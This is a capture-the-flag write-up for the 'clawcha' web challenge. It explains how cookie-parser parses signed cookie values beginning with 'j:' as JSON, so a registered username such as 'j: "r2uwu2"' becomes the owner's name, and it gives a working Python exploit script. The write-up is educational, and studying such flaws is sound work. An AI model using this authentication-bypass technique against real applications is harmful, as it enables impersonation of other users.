# clawcha

**Category:** web

---

#### Description

The server runs a "claw machine" gacha. The `flag` item exists server-side but has probability `1e-15`, so you realistically only get it if you are the special owner user `r2uwu2` (the server bypasses the probability check for owners).

Authentication is via a signed cookie `username` (`cookie-parser` signed cookies).

#### Solution

The bug is a logic mismatch in `cookie-parser`: after verifying a signed cookie, it also tries to parse any cookie value starting with `j:` as JSON (the "JSON cookie" feature). The app then uses the *post-parsed* `req.signedCookies.username` for authentication.

So we can register a new user whose username is a JSON-cookie payload that parses to the *string* `r2uwu2`, e.g.:

`j: "r2uwu2"`

`cookie-parser` will:

1. Verify the signature for the raw value `j: "r2uwu2"` (valid, since the server signed it for us on `/login`).
2. Parse it as JSON (because it starts with `j:`), turning it into the string `r2uwu2`.

Now `req.signedCookies.username` becomes `r2uwu2`, the app loads the real owner object from its `users` map, and `/claw` will always succeed for `flag`.

Exploit script:

```python
#!/usr/bin/env python3
import os
import random
import requests

TARGET = "https://clawcha.chall.lac.tf"

def main() -> None:
    # cookie-parser treats values starting with "j:" as JSON and parses them.
    # JSON.parse ignores whitespace, so we can add random spaces to avoid collisions
    # if someone already registered a particular username string.
    spaces = " " * random.randint(1, 32)
    username = f'j:{spaces}"r2uwu2"'
    password = os.urandom(8).hex()

    s = requests.Session()

    r = s.post(f"{TARGET}/login", json={"username": username, "password": password}, timeout=15)
    r.raise_for_status()
    assert r.json().get("success") is True

    r = s.post(f"{TARGET}/claw", json={"item": "flag"}, timeout=15)
    r.raise_for_status()
    j = r.json()
    assert j.get("success") is True
    print(j["msg"])

if __name__ == "__main__":
    main()
```

Running it prints the flag from the server response.
